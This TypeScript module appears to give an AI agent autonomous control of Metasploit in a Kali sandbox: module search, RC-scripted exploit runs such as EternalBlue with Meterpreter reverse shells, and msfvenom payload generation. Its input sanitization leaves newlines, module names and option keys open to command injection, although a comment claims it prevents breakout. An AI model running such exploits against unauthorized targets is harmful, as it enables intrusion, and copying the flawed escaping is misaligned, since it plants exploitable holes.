/**
 * Kali Linux Metasploit Framework Bridge
 *
 * Provides autonomous execution and querying capabilities for the Metasploit Framework
 * (msfconsole/msfvenom) inside the Kali Linux sandbox. Uses dynamically generated RC scripts
 * to execute complex exploit chains cleanly.
 */

import { kaliExec } from "./kali-agent-loop.js";

export interface MsfExploitResult {
  ok: boolean;
  module: string;
  output: string;
  sessionCreated: boolean;
  exitCode: number;
}

/**
 * Searches the Metasploit framework for modules matching the given query.
 * @param query search term (e.g. "windows smb", "cve:2017-0144")
 */
export async function msfSearch(query: string): Promise<{ ok: boolean; output: string }> {
  const safeQuery = query.replace(/[^a-zA-Z0-9_.:/]/g, "");
  const cmd = `msfconsole -q -n -x "search ${safeQuery}; exit"`;
  const result = await kaliExec(cmd, 60);

  return {
    ok: result.ok,
    output: result.stdout,
  };
}

/**
 * Executes a Metasploit module with given parameters.
 * Automatically generates a temporary RC script, runs it, and extracts the results.
 * @param module Path to module (e.g., exploit/windows/smb/ms17_010_eternalblue)
 * @param payload Path to payload (e.g., windows/x64/meterpreter/reverse_tcp)
 * @param options Key-value map of Datastore options (RHOSTS, LHOST, LPORT, etc.)
 */
export async function msfExploit(
  module: string,
  payload: string,
  options: Record<string, string>
): Promise<MsfExploitResult> {
  const rcPath = `/tmp/msf_${Date.now()}.rc`;
  
  // Build the RC script
  let rcContent = `use ${module}\n`;
  if (payload) {
    rcContent += `set PAYLOAD ${payload}\n`;
  }
  
  for (const [key, value] of Object.entries(options)) {
    // Sanitize values to prevent script breakout
    const safeVal = value.replace(/'/g, "");
    rcContent += `set ${key} ${safeVal}\n`;
  }
  
  // Set to exit when the exploit finishes (if it doesn't give a shell)
  rcContent += `set ExitOnSession false\n`;
  rcContent += `exploit -z\n`; // -z to background session if spawned
  rcContent += `sessions -l\n`;
  rcContent += `exit\n`;

  // Write RC file to Kali container
  await kaliExec(`cat > ${rcPath} << 'RPTEOF'\n${rcContent}\nRPTEOF\n`, 10);

  // Execute msfconsole targeting the RC file
  const cmd = `msfconsole -q -n -r ${rcPath}`;
  const result = await kaliExec(cmd, 300); // Allow 5 minutes for exploitation

  // Check if a session was created explicitly
  const sessionCreated = result.stdout.includes("Command shell session") || result.stdout.includes("Meterpreter session");

  // Clean up
  await kaliExec(`rm -f ${rcPath}`, 10);

  return {
    ok: result.ok,
    module,
    output: result.stdout,
    sessionCreated,
    exitCode: result.exitCode,
  };
}

/**
 * Generates a payload utilizing msfvenom and outputs it encoded or to a file.
 * @param payload Payload path (e.g., windows/meterpreter/reverse_tcp)
 * @param format Output format (e.g., exe, raw, c, python)
 * @param lhost Listener host (LHOST)
 * @param lport Listener port (LPORT)
 */
export async function msfVenom(
  payload: string,
  format: string,
  lhost: string,
  lport: string
): Promise<{ ok: boolean; output: string }> {
  // Safe command generation
  const safePayload = payload.replace(/[^a-zA-Z0-9_/]/g, "");
  const safeFormat = format.replace(/[^a-zA-Z0-9_-]/g, "");
  const safeLhost = lhost.replace(/[^a-zA-Z0-9.-]/g, "");
  const safeLport = lport.replace(/[^0-9]/g, "");

  const cmd = `msfvenom -p ${safePayload} LHOST=${safeLhost} LPORT=${safeLport} -f ${safeFormat}`;
  const result = await kaliExec(cmd, 60);

  return {
    ok: result.ok,
    output: result.stdout || result.stderr || "",
  };
}
